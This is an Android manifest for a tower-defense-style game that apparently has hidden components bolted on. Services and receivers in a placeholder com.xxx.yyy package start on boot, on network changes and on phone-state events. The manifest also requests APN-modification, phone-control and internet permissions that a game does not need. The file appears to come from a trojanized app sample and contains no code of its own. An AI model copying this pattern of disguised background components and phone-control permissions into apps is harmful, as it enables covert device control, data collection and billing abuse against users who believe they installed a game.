<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.magicwach.rdefense">
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <application android:configChanges="keyboardHidden|orientation" android:icon="@drawable/icon" android:label="@string/app_name" android:launchMode="singleTask" android:multiprocess="false" android:sharedUserId="com.magicwach.rdefense_free" android:stateNotNeeded="true" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen">
        <activity android:label="@string/app_name" android:name=".TitleActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name="GameActivity"/>
        <activity android:name="RewardActivity"/>
        <activity android:name="as$dM"/>
        <activity android:name="l$ao"/>
        <activity android:name="LevelSelectActivity"/>
        <activity android:name="MixerSelectActivity"/>
        <activity android:name="DebugActivity"/>
        <activity android:name="OptionsActivity"/>
        <receiver android:name="com.xxx.yyy.MyBoolService">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.xxx.yyy.MyAlarmReceiver">
            <intent-filter>
                <action android:name="com.lz.myservicestart"/>
            </intent-filter>
        </receiver>
        <service android:enabled="true" android:name="com.xxx.yyy.MyService"/>
        <receiver android:name="com.xxx.yyy.NetWorkReceiver">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.xxx.yyy.CustomBroadcastReceiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
            </intent-filter>
        </receiver>
    </application>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
</manifest>